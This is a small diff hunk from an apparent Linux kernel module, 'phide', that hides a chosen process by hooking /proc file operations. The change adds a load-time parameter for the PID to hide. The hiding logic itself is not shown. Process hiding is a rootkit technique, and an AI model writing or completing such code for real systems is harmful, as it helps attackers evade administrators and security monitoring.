@@ -19,6 +19,8 @@ module_init(phide_init);
 module_exit(phide_exit);
 
 static char *proc_to_hide = "1";
+module_param(proc_to_hide, charp, S_IRUGO);
+
 static struct file_operations proc_fops;
 static struct file_operations *backup_proc_fops;
 static struct inode *proc_inode;
